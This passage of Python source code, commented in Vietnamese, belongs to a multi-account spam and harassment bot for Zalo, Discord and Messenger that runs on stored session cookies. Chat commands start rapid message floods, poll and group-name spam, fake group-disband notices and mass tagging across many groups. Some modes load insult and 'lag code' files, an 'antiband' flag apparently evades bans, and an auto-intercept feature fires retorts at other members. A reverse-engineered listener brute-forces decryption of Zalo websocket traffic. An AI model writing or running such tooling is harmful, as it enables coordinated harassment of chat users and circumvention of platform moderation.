        matched_rec = resolve_file_record(file_query)
        blocks = get_blocks_from_file_query(file_query, mode=chosen_mode)
    elif remaining_content and (remaining_content.isdigit() or remaining_content.lower().endswith(".txt")):
        matched_rec = resolve_file_record(remaining_content)
        blocks = get_blocks_from_file_query(remaining_content, mode=chosen_mode)
    elif tokens[consumed:] and (tokens[consumed].isdigit() or tokens[consumed].lower().endswith(".txt")):
        cand_fq = tokens[consumed]
        matched_rec = resolve_file_record(cand_fq)
        if matched_rec:
            blocks = get_blocks_from_file_query(cand_fq, mode=chosen_mode)
            remaining_content = ""

    if matched_rec:
        with SYSTEM_CFG_LOCK:
            SYSTEM_RUNTIME_CONFIG["selected_file"] = matched_rec["filename"]
            SYSTEM_RUNTIME_CONFIG.setdefault("selected_file_by_acc", {})[str(acc_id)] = matched_rec["filename"]

    if not blocks and remaining_content and not file_query:
        if chosen_mode == "treo_nhay":
            if ";" in remaining_content:
                blocks = [strip_leading_line_number(x.strip()) for x in remaining_content.split(";") if x.strip()]
            elif "\n" in remaining_content:
                blocks = [strip_leading_line_number(x.strip()) for x in remaining_content.split("\n") if x.strip()]
            else:
                blocks = [strip_leading_line_number(remaining_content)]
        elif chosen_mode == "treo_ngon":
            blocks = [remaining_content.replace(";", "\n")]
        else:
            blocks = [x.strip() for x in remaining_content.split(";") if x.strip()] if ";" in remaining_content else [remaining_content]

    # Loại bỏ mọi phần tử chỉ chứa mã Tag <@...> hoặc @Tên bị sót lại trong blocks
    if blocks:
        cleaned_blocks = []
        for b_item in blocks:
            b_check = re.sub(r"<@(?:!|&)?\d+>", "", str(b_item or "")).strip()
            if b_check and not re.fullmatch(r"@[\w\s\.\-_À-ỹ]+", b_check):
                cleaned_blocks.append(b_item)
        blocks = cleaned_blocks

    # TỰ ĐỘNG NẠP FILE ĐÃ CHỌN TRONG CHẾ ĐỘ CHỌN FILE (FILE NHÂY / FILE NGÔN / FILE CHUYÊN BIỆT):
    if not blocks:
        with SYSTEM_CFG_LOCK:
            if chosen_mode == "treo_ngon":
                pre_selected_fn = (
                    SYSTEM_RUNTIME_CONFIG.get("selected_ngon_by_acc", {}).get(str(acc_id))
                    or SYSTEM_RUNTIME_CONFIG.get("selected_file_by_acc", {}).get(str(acc_id))
                    or SYSTEM_RUNTIME_CONFIG.get("selected_ngon_file")
                    or "ngon.txt"
                )
            elif chosen_mode == "nhay_namebox":
                pre_selected_fn = (
                    SYSTEM_RUNTIME_CONFIG.get("selected_file_by_acc", {}).get(str(acc_id))
                    or "nhaynamebox.txt"
                )
            elif chosen_mode in ("treo_so", "so_tag", "so_tag_faketen"):
                pre_selected_fn = "so.txt"
            elif chosen_mode == "code_lag":
                pre_selected_fn = "codelag.txt"
            elif chosen_mode == "nhay_icon":
                pre_selected_fn = "nhayicon.txt"
            elif chosen_mode == "idea_mess":
                pre_selected_fn = "chui.txt"
            elif chosen_mode == "nhay_2c":
                pre_selected_fn = "2c.txt"
            else:
                pre_selected_fn = (
                    SYSTEM_RUNTIME_CONFIG.get("selected_nhay_by_acc", {}).get(str(acc_id))
                    or SYSTEM_RUNTIME_CONFIG.get("selected_file_by_acc", {}).get(str(acc_id))
                    or SYSTEM_RUNTIME_CONFIG.get("selected_nhay_file")
                    or SYSTEM_RUNTIME_CONFIG.get("selected_file")
                    or "nhay.txt"
                )
        if chosen_mode == "nhay_giaitan":
            real_bname = zalo_client.get_group_real_name(thread_id) if (platform == "zalo" and zalo_client) else ""
            blocks = [real_bname] if real_bname else ["auto"]
        elif pre_selected_fn:
            blocks = get_blocks_from_file_query(pre_selected_fn, mode=chosen_mode)
            if not blocks:
                blocks = get_blocks_from_file_query("1", mode=chosen_mode)
            if blocks:
                blocks = [
                    b_item for b_item in blocks
                    if re.sub(r"<@(?:!|&)?\d+>", "", str(b_item or "")).strip()
                    and not re.fullmatch(r"@[\w\s\.\-_À-ỹ]+", re.sub(r"<@(?:!|&)?\d+>", "", str(b_item or "")).strip())
                ]
        if not blocks:
            blocks = ["Hệ Thống Siêu Tốc Đẳng Cấp 2026", "Tốc độ ánh sáng cân mọi chiến trường"]

    if not blocks and chosen_mode in ("nhay_typing", "nhay_theme"):
        blocks = ["Cầu Vồng Cyber 2026", "Hoàng Kim Tối Thượng", "Đỏ Quyền Lực Đế Vương"]

    if is_auto_shuffle and len(blocks) > 1:
        blocks = list(blocks)
        random.shuffle(blocks)

    if len(target_obj) > 1:
        stop_tasks_for_thread(None, acc_id=acc_id)
    else:
        stop_tasks_for_thread(thread_id, acc_id=acc_id)

    hide_name_flag = True if cmd_token in ("antan", "tagan", "antag") else bool(SYSTEM_RUNTIME_CONFIG.get("hide_tag_name", False) and cmd_token not in ("hientag", "nhaytag"))

    # Bắn ngay phát đầu tiên trong 0.001s trên làn ưu tiên (_PRIORITY_CMD_EXECUTOR + priority_bypass=True)
    # để vừa gõ lệnh là tin nhắn / Poll nổ ra ngay lập tức không có bất kỳ độ trễ khởi động nào!
    if blocks and target_obj:
        first_pkt = str(blocks[0])
        if chosen_mode != "treo_ngon":
            first_pkt = strip_leading_line_number(first_pkt, preserve_indent=True)
        if not use_emoji or int(icon_count or 0) <= 0:
            first_pkt = strip_trailing_icons_when_zero(first_pkt)

        shot_g_ep, _ = get_current_epochs(None)
        def _instant_first_shot(t_item):
            t_id_now = str(t_item.get("id") or thread_id)
            if is_task_stopped_fast(None, shot_g_ep, None, t_id_now):
                return
            try:
                if platform == "zalo" and zalo_client:
                    if chosen_mode == "nhay_poll":
                        if "|" in first_pkt:
                            q_0, o_0 = first_pkt.split("|", 1)
                            opts_0 = [x.strip() for x in o_0.replace(";", "|").split("|") if x.strip()]
                        elif len(blocks) >= 3:
                            q_0 = first_pkt
                            opts_0 = [str(blocks[1]).strip()[:60], str(blocks[2]).strip()[:60]]
                        else:
                            q_0 = first_pkt
                            opts_0 = [f"{first_pkt[:35]} #1", f"{first_pkt[:35]} #2"]
                        zalo_client.create_poll(t_id_now, q_0.strip(), opts_0)
                    elif chosen_mode == "nhay_namebox":
                        zalo_client.change_group_name(t_id_now, first_pkt)
                    elif chosen_mode == "nhay_theme":
                        zalo_client.change_group_theme(t_id_now, first_pkt if first_pkt else None, is_group=True)
                    elif chosen_mode == "nhay_typing":
                        zalo_client.send_typing(t_id_now, is_group=True)
                    elif chosen_mode == "zalo_gif":
                        zalo_client.send_gif_or_sticker(
                            t_id_now, text_msg=first_pkt, is_group=True,
                            mentions=extracted_mentions, tag_all=extracted_tag_all,
                            color_mode=color_mode, fixed_color=fixed_color
                        )
                    elif chosen_mode == "treo_sticker":
                        zalo_client.send_native_sticker(t_id_now, keyword=first_pkt, is_group=True)
                    elif chosen_mode == "nhay_giaitan":
                        zalo_client.spam_group_disband_notification(t_id_now, group_name=first_pkt or "Lũ vdanh", send_inbox_alert=False)
                    else:
                        zalo_client.send_adv(
                            first_pkt, t_id_now, color_mode=color_mode, fixed_color=fixed_color,
                            is_group=True, mentions=extracted_mentions, tag_all=extracted_tag_all,
                            is_heading=is_heading, antiband=antiband_flag, use_emoji=use_emoji,
                            icon_count=icon_count, auto_retry_thread_type=True,
                            strip_line_num=(chosen_mode != "treo_ngon"),
                            hide_tag_all=True, hide_tag_name=hide_name_flag, priority_bypass=True
                        )
                elif platform == "discord" and discord_client:
                    msg_ln0 = (first_pkt + " " + build_unique_zalo_icons(icon_count)) if (use_emoji and icon_count > 0) else first_pkt
                    discord_client.send_message(
                        t_id_now, msg_ln0, color_mode=color_mode, fixed_color=fixed_color,
                        antiband=antiband_flag, mentions=extracted_mentions, tag_all=extracted_tag_all,
                        strip_line_num=(chosen_mode != "treo_ngon"), is_heading=is_heading,
                        priority_bypass=True
                    )
                elif platform == "messenger" and messenger_client:
                    messenger_client.send_message(
                        t_id_now, first_pkt, is_group=True, mentions=extracted_mentions,
                        tag_all=extracted_tag_all, antiband=antiband_flag,
                        use_emoji=use_emoji, icon_count=icon_count, is_heading=is_heading
                    )
            except Exception:
                pass

        for t_item_0 in target_obj[:16]:
            _PRIORITY_CMD_EXECUTOR.submit(_instant_first_shot, t_item_0)

    # Cô lập từng Cookie ('cookie nào thì cookie ấy tự sài, không chồng chéo'):
    # Khi gõ lệnh trong khung chat trên Cookie nào (acc_row), mặc định CHỈ đúng Cookie đó tự thực thi lệnh bằng phiên của chính nó!
    # Chỉ khi người dùng chủ động gõ kèm từ khóa 'daacc' / 'allacc' thì mới huy động tất cả Cookie cùng chạy.
    wants_multi_cookie = any(k_m in text.lower().split() for k_m in ("daacc", "allacc", "multiacc"))
    if wants_multi_cookie:
        active_box_accs = get_accounts_present_in_thread(
            platform=platform, thread_id=thread_id, is_group=is_group, fallback_acc_row=acc_row
        )
    else:
        active_box_accs = [acc_row]
    active_box_acc_ids = [int(a["id"]) for a in active_box_accs if a and a.get("id")] or [int(acc_id)]

    tid = start_task_programmatic(
        targets=target_obj,
        hide_tag_all=True,
        hide_tag_name=hide_name_flag,
        blocks=blocks,
        delay=delay_val,
        use_emoji=use_emoji,
        icon_count=icon_count,
        tag_users=extracted_mentions,
        tag_all=extracted_tag_all,
        is_heading=is_heading,
        multi_acc=(len(active_box_acc_ids) > 1),
        mode=chosen_mode,
        color_mode=color_mode,
        fixed_color=fixed_color,
        antiband=antiband_flag,
        antidieall=True,
        specific_acc_id=acc_id,
        account_ids=active_box_acc_ids,
        source_label="chat",
        trigger_cmd=text
    )

    tag_parts = []
    if extracted_tag_all:
        tag_parts.append("@All")
    if extracted_mentions:
        tag_parts.append(", ".join("@" + m["name"] for m in extracted_mentions))
    tag_desc = " + ".join(tag_parts) if tag_parts else "Không tag"
    box_desc = f"{len(target_obj)} nhóm đồng loạt" if len(target_obj) > 1 else "1 nhóm hiện tại"
    log_system_command(acc_id, thread_id, sender_id, text, f"[{platform.upper()}] Chạy {chosen_mode} trên {box_desc} (Delay {delay_val}s) | Tag: {tag_desc}")
    return True

# LISTENER 24/7 TRÊN ZALO (WEBSOCKET + HTTP FALLBACK)
_SHARED_ZALO_POLLER_POOL = ThreadPoolExecutor(max_workers=32)

class ZaloRealtimeListener:
    def __init__(self, acc_id):
        self.acc_id = acc_id
        self.platform = "zalo"
        self.stop_ev = threading.Event()
        self.seen_msg_ids = deque(maxlen=3500)
        self.seeded_groups = set()
        self.last_grid_vers = {}
        self.poll_cursor = 0
        self.ws_cipher_key = None
        self.ws_conflict_until = 0.0
        self.started_at = time.time()
        self.ws_status = "Đang khởi tạo Zalo Shield..."
        self.last_event_ts = 0.0
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.poller_thread = threading.Thread(target=self._run_http_poller_loop, daemon=True)

    def start(self):
        self.thread.start()
        self.poller_thread.start()

    def stop(self):
        self.stop_ev.set()

    def _get_acc_row(self):
        return get_account_from_ram(self.acc_id)

    @staticmethod
    def _recv_exact(sock, n):
        buf = bytearray()
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                return None
            buf.extend(chunk)
        return bytes(buf)

    @staticmethod
    def _send_ws_frame(sock, payload_bytes, opcode=0x2):
        mask_key = os.urandom(4)
        length = len(payload_bytes)
        header = bytearray([0x80 | (opcode & 0x0F)])
        if length < 126:
            header.append(0x80 | length)
        elif length < 65536:
            header.append(0x80 | 126)
            header.extend(struct.pack(">H", length))
        else:
            header.append(0x80 | 127)
            header.extend(struct.pack(">Q", length))
        header.extend(mask_key)
        masked_payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload_bytes))
        sock.sendall(bytes(header) + masked_payload)

    def _try_decompress_or_json(self, raw_bytes):
        if not raw_bytes:
            return None
        for wbits in (16 + zlib.MAX_WBITS, zlib.MAX_WBITS, -zlib.MAX_WBITS):
            try:
                decomp = zlib.decompress(raw_bytes, wbits)
                txt = decomp.decode("utf-8", errors="ignore").strip()
                if txt.startswith("{") or txt.startswith("["):
                    return json.loads(txt)
            except Exception:
                pass
        try:
            txt = raw_bytes.decode("utf-8", errors="ignore").strip()
            if txt.startswith("{") or txt.startswith("["):
                return json.loads(txt)
        except Exception:
            pass
        return None

    def _decode_ws_payload(self, client, raw_data_str, encrypt_type):
        if not raw_data_str:
            return None
        try:
            if encrypt_type == 0:
                return json.loads(raw_data_str) if isinstance(raw_data_str, str) else raw_data_str

            s_raw = unquote(str(raw_data_str)) if "%" in str(raw_data_str) else str(raw_data_str)
            s_raw = s_raw.strip()
            pad_rem = len(s_raw) % 4
            if pad_rem:
                s_raw += "=" * (4 - pad_rem)
            b_data = base64.b64decode(s_raw)

            key_candidates = []
            for k_str in (self.ws_cipher_key, client.secret_key):
                if not k_str:
                    continue
                k_clean = unquote(str(k_str)).strip()
                for cand_fn in (
                    lambda x: base64.b64decode(x + ("=" * ((4 - len(x) % 4) % 4))),
                    lambda x: x.encode("utf-8"),
                    lambda x: bytes.fromhex(x),
                ):
                    try:
                        kb = cand_fn(k_clean)
                        if len(kb) in (16, 24, 32) and kb not in key_candidates:
                            key_candidates.append(kb)
                    except Exception:
                        pass

            if encrypt_type == 1:
                try:
                    raw_g = gzip.decompress(b_data).decode("utf-8", errors="ignore").strip()
                    if raw_g.startswith("{") or raw_g.startswith("["):
                        return json.loads(raw_g)
                except Exception:
                    pass
                for wbits in (16 + zlib.MAX_WBITS, zlib.MAX_WBITS, -zlib.MAX_WBITS):
                    try:
                        raw_z = zlib.decompress(b_data, wbits).decode("utf-8", errors="ignore").strip()
                        if raw_z.startswith("{") or raw_z.startswith("["):
                            return json.loads(raw_z)
                    except Exception:
                        pass

            if encrypt_type == 2 and len(b_data) >= 48:
                iv_zws = b_data[:16]
                aad_zws = b_data[16:32]
                ct_zws = b_data[32:]
                for kb in key_candidates:
                    try:
                        cipher = AES.new(kb, AES.MODE_GCM, nonce=iv_zws)
                        cipher.update(aad_zws)
                        pt = cipher.decrypt_and_verify(ct_zws[:-16], ct_zws[-16:])
                        for wb in (16, 16 + zlib.MAX_WBITS, zlib.MAX_WBITS, -zlib.MAX_WBITS):
                            try:
                                dec_str = zlib.decompress(pt, wbits=wb).decode("utf-8", errors="ignore").strip()
                                if dec_str.startswith("{") or dec_str.startswith("["):
                                    return json.loads(dec_str)
                            except Exception:
                                pass
                        res = self._try_decompress_or_json(pt)
                        if res is not None:
                            return res
                    except Exception:
                        pass

            if encrypt_type in (1, 3):
                for kb in key_candidates:
                    for iv_cand, body_cand in ((bytes(16), b_data), (b_data[:16], b_data[16:])):
                        if not body_cand or len(body_cand) % 16 != 0:
                            continue
                        try:
                            cipher = AES.new(kb, AES.MODE_CBC, iv_cand)
                            dec_bytes = cipher.decrypt(body_cand)
                            if dec_bytes:
                                pad_v = dec_bytes[-1]
                                if 1 <= pad_v <= 16 and all(b == pad_v for b in dec_bytes[-pad_v:]):
                                    dec_bytes = dec_bytes[:-pad_v]
                            res = self._try_decompress_or_json(dec_bytes)
                            if res is not None:
                                return res
                        except Exception:
                            pass

            if len(b_data) > 32:
                iv = b_data[:16]
                for kb in key_candidates:
                    if len(b_data) >= 64:
                        try:
                            cipher = AES.new(kb, AES.MODE_GCM, nonce=iv)
                            cipher.update(b_data[16:48])
                            pt = cipher.decrypt_and_verify(b_data[48:-16], b_data[-16:])
                            res = self._try_decompress_or_json(pt)
                            if res is not None:
                                return res
                        except Exception:
                            pass
                    if len(b_data) >= 48:
                        try:
                            cipher = AES.new(kb, AES.MODE_GCM, nonce=iv)
                            cipher.update(b_data[16:32])
                            pt = cipher.decrypt_and_verify(b_data[32:-16], b_data[-16:])
                            res = self._try_decompress_or_json(pt)
                            if res is not None:
                                return res
                        except Exception:
                            pass
                    for sl_ct, sl_tag in ((b_data[48:-16], b_data[-16:]), (b_data[32:-16], b_data[-16:]), (b_data[16:-16], b_data[-16:])):
                        if not sl_ct:
                            continue
                        try:
                            cipher = AES.new(kb, AES.MODE_GCM, nonce=iv)
                            pt = cipher.decrypt_and_verify(sl_ct, sl_tag)
                            res = self._try_decompress_or_json(pt)
                            if res is not None:
                                return res
                        except Exception:
                            pass

            for kb in key_candidates:
                for iv_cand, body_cand in ((bytes(16), b_data), (b_data[:16], b_data[16:])):
                    if not body_cand or len(body_cand) % 16 != 0:
                        continue
                    try:
                        cipher = AES.new(kb, AES.MODE_CBC, iv_cand)
                        dec_bytes = cipher.decrypt(body_cand)
                        if dec_bytes:
                            pad_v = dec_bytes[-1]
                            if 1 <= pad_v <= 16 and all(b == pad_v for b in dec_bytes[-pad_v:]):
                                dec_bytes = dec_bytes[:-pad_v]
                        res = self._try_decompress_or_json(dec_bytes)
                        if res is not None:
                            return res
                    except Exception:
                        pass

            for cand in (b_data, b_data[16:], b_data[32:], b_data[4:]):
                res = self._try_decompress_or_json(cand)
                if res is not None:
                    return res
        except Exception:
            pass
        return None

    def _extract_msg_dicts(self, obj, parent_is_group=False, parent_grid=None):
        found = []
        if isinstance(obj, dict):
            cur_grid = (
                _clean_zalo_id(obj.get("grid"))
                or _clean_zalo_id(obj.get("groupId"))
                or _clean_zalo_id(obj.get("group_id"))
                or _clean_zalo_id(parent_grid)
            )
            is_grp_branch = parent_is_group or bool(cur_grid)
            has_content = ("content" in obj) or ("msg" in obj) or ("message" in obj) or ("text" in obj) or ("title" in obj)
            if has_content and any(k in obj for k in ("uidFrom", "idTo", "msgId", "cliMsgId", "toid", "fromUid", "grid")):
                item = dict(obj)
                if is_grp_branch:
                    item["_is_group_hint"] = True
                if cur_grid:
                    item["grid"] = cur_grid
                    item["_grid_hint"] = cur_grid
                found.append(item)
                # Không đệ quy vào bên trong quote/content của tin nhắn đã khớp để tránh bóc nhầm tin nhắn trích dẫn (quote) gây lỗi box null!
                return found
            for k, v in obj.items():
                if k in ("quote", "propertyExt", "params"):
                    continue
                sub_grp = is_grp_branch or (k in ("groupMsgs", "group_msgs", "grid"))
                sub_grid = cur_grid
                if not sub_grid and str(k).isdigit() and len(str(k)) >= 8 and sub_grp:
                    sub_grid = str(k)
                if isinstance(v, (dict, list)):
                    found.extend(self._extract_msg_dicts(v, parent_is_group=sub_grp, parent_grid=sub_grid))
        elif isinstance(obj, list):
            for elem in obj:
                if isinstance(elem, (dict, list)):
                    found.extend(self._extract_msg_dicts(elem, parent_is_group=parent_is_group, parent_grid=parent_grid))
        return found

    def _extract_raw_mentions_from_msg_obj(self, msg_obj):
        def _parse_candidate(val):
            if isinstance(val, list) and val:
                return val
            if isinstance(val, dict):
                if "mentions" in val:
                    return _parse_candidate(val["mentions"])
                if "mentionInfo" in val:
                    return _parse_candidate(val["mentionInfo"])
                if "uid" in val or "pos" in val:
                    return [val]
            if isinstance(val, str):
                s = val.strip()
                if s.startswith("[") or s.startswith("{"):
                    try:
                        return _parse_candidate(json.loads(s))
                    except Exception:
                        pass
            return None

        for key in ("mentions", "mentionInfo", "propertyExt", "params"):
            res = _parse_candidate(msg_obj.get(key))
            if res:
                return res
        return None

    @staticmethod
    def _make_msg_dedupe_key(msg_obj, content=""):
        mid = _clean_zalo_id(msg_obj.get("msgId") or msg_obj.get("globalMsgId") or msg_obj.get("id"))
        cmid = _clean_zalo_id(msg_obj.get("cliMsgId"))
        ts_v = _clean_zalo_id(msg_obj.get("ts") or msg_obj.get("time"))
        if mid:
            return f"mid:{mid}"
        if cmid:
            return f"cmid:{cmid}"
        if ts_v:
            return f"ts:{ts_v}:{content[:30]}"
        return f"win:{int(time.time())}:{content[:30]}"

    def _check_and_mark_seen(self, msg_obj, content="", mark=True):
        """Kiểm tra & đánh dấu chống trùng lặp nguyên tử 3 Tầng (msgId + cliMsgId + ts:content):
        - Luôn ghi nhận ĐỒNG THỜI cả mid, cmid và ts:content vào seen_msg_ids để dù WebSocket có cliMsgId
          còn get_recent_group_messages có msgId thì vẫn khớp 100% qua ts:content — không bao giờ chạy lệnh 2 lần!"""
        lock = getattr(self, "_dedupe_lock", None)
        if lock is None:
            lock = threading.RLock()
            self._dedupe_lock = lock
        mid = _clean_zalo_id(msg_obj.get("msgId") or msg_obj.get("globalMsgId") or msg_obj.get("id"))
        cmid = _clean_zalo_id(msg_obj.get("cliMsgId"))
        ts_raw = _clean_zalo_id(msg_obj.get("ts") or msg_obj.get("time"))
        try:
            ts_int = int(ts_raw or 0)
            if 0 < ts_int < 10000000000:
                ts_int *= 1000
            ts_v = str(ts_int) if ts_int > 0 else ts_raw
        except Exception:
            ts_v = ts_raw
        norm_c = re.sub(r"\s+", " ", str(content or "").strip()).lower()[:40]
        keys = []
        if mid:
            keys.append(f"mid:{mid}")
        if cmid:
            keys.append(f"cmid:{cmid}")
        if ts_v and norm_c:
            keys.append(f"ts:{ts_v}:{norm_c}")
        if not keys:
            keys.append(f"win:{int(time.time() // 3)}:{norm_c}")
        with lock:
            for k in keys:
                if k in self.seen_msg_ids:
                    if mark:
                        for k2 in keys:
                            if k2 not in self.seen_msg_ids:
                                self.seen_msg_ids.append(k2)
                    return True
            if mark:
                for k in keys:
                    self.seen_msg_ids.append(k)
            return False

    def _process_msg_item(self, client, acc_row, msg_obj, default_is_group=False, fallback_thread_id=None):
        if not isinstance(msg_obj, dict):
            return

        msg_id = _clean_zalo_id(msg_obj.get("msgId") or msg_obj.get("globalMsgId") or msg_obj.get("id"))
        cli_msg_id = _clean_zalo_id(msg_obj.get("cliMsgId"))
        raw_content = msg_obj.get("content")
        if isinstance(raw_content, dict):
            raw_content = (
                raw_content.get("title")
                or raw_content.get("text")
                or raw_content.get("msg")
                or raw_content.get("description")
                or ""
            )
        elif isinstance(raw_content, str) and raw_content.strip().startswith("{"):
            try:
                rc_json = json.loads(raw_content.strip())
                if isinstance(rc_json, dict):
                    raw_content = (
                        rc_json.get("title")
                        or rc_json.get("text")
                        or rc_json.get("msg")
                        or rc_json.get("description")
                        or raw_content
                    )
            except Exception:
                pass

        if not raw_content or not isinstance(raw_content, str):
            raw_content = str(msg_obj.get("message") or msg_obj.get("msg") or msg_obj.get("text") or "")

        if is_system_echo_message(msg_id=msg_id, client_id=cli_msg_id, text=raw_content):
            return

        content = strip_invisible_chars(raw_content)
        if not content:
            return

        # Không đánh rớt tin nhắn mới chưa từng thấy (unseen) vì lệch đồng hồ server/client;
        # chỉ lọc bằng bộ nhớ nguyên tử seen_msg_ids của riêng từng Cookie!

        if self._check_and_mark_seen(msg_obj, content, mark=True):
            return

        my_uid = _clean_zalo_id(client.uid or acc_row.get("uid"))
        my_s2m = _clean_zalo_id(getattr(client, "send2me_id", ""))
        fb_tid = _clean_zalo_id(fallback_thread_id)
        grid_id = (
            _clean_zalo_id(msg_obj.get("grid"))
            or _clean_zalo_id(msg_obj.get("groupId"))
            or _clean_zalo_id(msg_obj.get("_grid_hint"))
            or fb_tid
        )
        raw_uid_from = str(msg_obj.get("uidFrom") or msg_obj.get("fromUid") or "").strip()
        uid_from = _clean_zalo_id(raw_uid_from)
        d_name = str(msg_obj.get("dName") or "").strip()
        if uid_from and d_name and d_name.lower() not in ("null", "none"):
            GLOBAL_USER_NAME_CACHE[uid_from] = d_name

        id_to = _clean_zalo_id(msg_obj.get("idTo") or msg_obj.get("toid"))
        cmd_num = int(msg_obj.get("cmd") or 0)
        raw_mentions = self._extract_raw_mentions_from_msg_obj(msg_obj)

        known_gids = (KNOWN_GROUPS_BY_ACC.get(client.uid, set()) | ALL_KNOWN_ZALO_GROUP_IDS) - {"0", "", my_uid, my_s2m, "null", "None"}
        is_group = bool(
            default_is_group
            or bool(grid_id and grid_id not in (my_uid, my_s2m))
            or msg_obj.get("_is_group_hint")
            or msg_obj.get("isGroup")
            or (cmd_num in (521, 522))
            or (id_to and id_to in known_gids)
            or (uid_from and uid_from in known_gids)
            or bool(raw_mentions)
        )

        thread_id = ""
        if is_group:
            if fb_tid and fb_tid not in (my_uid, my_s2m):
                thread_id = fb_tid
            elif grid_id and grid_id not in (my_uid, my_s2m):
                thread_id = grid_id
            elif id_to and id_to in known_gids:
                thread_id = id_to
            elif uid_from and uid_from in known_gids:
                thread_id = uid_from
            elif id_to and id_to not in (my_uid, my_s2m):
                thread_id = id_to
            else:
                # Tuyệt đối KHÔNG lấy uid_from (ID cá nhân người gửi) làm ID Nhóm vì sẽ khiến Zalo tạo ra 'Box null'!
                return
            if thread_id and thread_id not in (my_uid, my_s2m):
                ALL_KNOWN_ZALO_GROUP_IDS.add(thread_id)
                if client.uid:
                    KNOWN_GROUPS_BY_ACC[client.uid].add(thread_id)
        else:
            if raw_uid_from in ("0", "", my_uid, my_s2m):
                if id_to and id_to not in (my_uid, my_s2m):
                    thread_id = id_to
                    if thread_id in known_gids:
                        is_group = True
                elif id_to in (my_uid, my_s2m) and (my_uid or my_s2m):
                    thread_id = id_to or my_uid
                else:
                    return
            else:
                thread_id = uid_from

        if not thread_id or thread_id in ("0", "null", "None", "undefined"):
            return

        reply_target = None
        quote_obj = msg_obj.get("quote")
        if isinstance(quote_obj, dict):
            q_uid = _clean_zalo_id(quote_obj.get("ownerId") or quote_obj.get("uidFrom"))
            q_name = str(quote_obj.get("fromD") or quote_obj.get("dName") or "").strip()
            if q_uid:
                reply_target = {"uid": q_uid, "name": q_name or GLOBAL_USER_NAME_CACHE.get(q_uid, f"User_{q_uid[-4:]}")}

        msg_ts_val = None
        try:
            _ts_n = int(msg_obj.get("ts") or msg_obj.get("time") or 0)
            if 0 < _ts_n < 10000000000:
                _ts_n *= 1000
            if _ts_n > 0:
                msg_ts_val = str(_ts_n)
        except Exception:
            pass
        sender_for_auth = "0" if raw_uid_from in ("0", "") else (uid_from or my_uid)
        # Ngắt khẩn cấp 0.00ms ngay trên luồng Listener nếu Chủ Acc / Người có quyền gõ .t / .ta / .stop / .stopall
        cmd_Quick = content.strip().lower().split()[0] if content.strip() else ""
        if cmd_Quick in (".t", ".st", ".stop", ".dung", ".tat", ".off", "/stop", "!t", "!stop"):
            if is_true_account_owner(sender_for_auth, client_uid=my_uid, client_send2me_id=my_s2m, platform="zalo") or is_user_authorized_for_cmd(sender_for_auth, my_uid, my_s2m, allow_all=False, sender_name=d_name, platform="zalo"):
                stop_tasks_for_thread(thread_id, acc_id=self.acc_id)
        elif cmd_Quick in (".ta", ".stopall", ".dunghet", ".tathet", "/stopall", "!ta", "!stopall"):
            if is_true_account_owner(sender_for_auth, client_uid=my_uid, client_send2me_id=my_s2m, platform="zalo") or is_user_authorized_for_cmd(sender_for_auth, my_uid, my_s2m, allow_all=False, sender_name=d_name, platform="zalo"):
                stop_tasks_for_thread(None, acc_id=self.acc_id)
        was_cmd = parse_and_execute_inchat_command(
            zalo_client=client,
            acc_row=acc_row,
            thread_id=thread_id,
            is_group=is_group,
            sender_id=sender_for_auth,
            raw_msg=content,
            raw_mentions=raw_mentions,
            platform="zalo",
            sender_name=d_name,
            msg_id=msg_id,
            cli_msg_id=cli_msg_id,
            msg_ts=msg_ts_val,
            reply_target=reply_target,
            raw_msg_obj=msg_obj
        )
        if not was_cmd and str(thread_id) in AUTO_INTERCEPT_BOXES:
            ic_cfg = AUTO_INTERCEPT_BOXES.get(str(thread_id))
            if ic_cfg and ic_cfg.get("enabled") and uid_from and uid_from not in ("0", my_uid, my_s2m) and uid_from not in OWNER_UIDS_CACHE:
                b_list = ic_cfg.get("blocks") or ["Phản đòn siêu tốc 0s!"]
                idx_c = ic_cfg.get("idx", 0)
                ic_cfg["idx"] = idx_c + 1
                reply_line = b_list[idx_c % len(b_list)]
                target_m = [{"uid": uid_from, "id": uid_from, "name": d_name or GLOBAL_USER_NAME_CACHE.get(uid_from) or f"User_{uid_from[-4:]}"}]
                threading.Thread(
                    target=lambda: client.send_adv(
                        reply_line, thread_id, color_mode="rainbow", is_group=is_group,
                        mentions=target_m, tag_all=False, is_heading=True, antiband=True,
                        use_emoji=False, icon_count=0, hide_tag_name=False
                    ),
                    daemon=True
                ).start()

    @classmethod
    def _recv_full_ws_message(cls, sock):
        frag_opcode = None
        frag_buf = bytearray()
        prev_timeout = sock.gettimeout()

        try:
            while True:
                hdr = cls._recv_exact(sock, 2)
                if not hdr:
                    return None, None
                sock.settimeout(18.0)
                fin = (hdr[0] & 0x80) != 0
                opcode = hdr[0] & 0x0F
                masked = (hdr[1] & 0x80) != 0
                payload_len = hdr[1] & 0x7F

                if payload_len == 126:
                    ext = cls._recv_exact(sock, 2)
                    if not ext:
                        return None, None
                    payload_len = struct.unpack(">H", ext)[0]
                elif payload_len == 127:
                    ext = cls._recv_exact(sock, 8)
                    if not ext:
                        return None, None
                    payload_len = struct.unpack(">Q", ext)[0]

                mask_bytes = cls._recv_exact(sock, 4) if masked else b""
                data = cls._recv_exact(sock, payload_len) if payload_len > 0 else b""
                if data is None:
                    return None, None
                if masked and mask_bytes:
                    data = bytes(b ^ mask_bytes[i % 4] for i, b in enumerate(data))

                if opcode == 0x8:
                    return 0x8, data
                if opcode == 0x9:
                    try:
                        cls._send_ws_frame(sock, data, opcode=0xA)
                    except Exception:
                        pass
                    sock.settimeout(prev_timeout)
                    continue
                if opcode == 0xA:
                    sock.settimeout(prev_timeout)
                    continue

                if opcode == 0x0:
                    frag_buf.extend(data)
                    if fin and frag_opcode is not None:
                        return frag_opcode, bytes(frag_buf)
                else:
                    if fin:
                        return opcode, data
                    frag_opcode = opcode
                    frag_buf = bytearray(data)
        finally:
            try:
                sock.settimeout(prev_timeout)
            except Exception:
                pass

    def _poll_single_group(self, client, acc_now, gid, is_version_delta=False):
        if self.stop_ev.is_set():
            return
        gid_clean = _clean_zalo_id(gid)
        if not gid_clean or gid_clean == str(client.uid or ""):
            return
        try:
            msgs = client.get_recent_group_messages(gid_clean)
            if not msgs:
                return
            now_ms = int(time.time() * 1000)
            if gid_clean not in self.seeded_groups and not is_version_delta:
                self.seeded_groups.add(gid_clean)
                for idx_m, m in enumerate(msgs):
                    if not isinstance(m, dict):
                        continue
                    rc = m.get("content") or m.get("message") or m.get("msg") or ""
                    if isinstance(rc, dict):
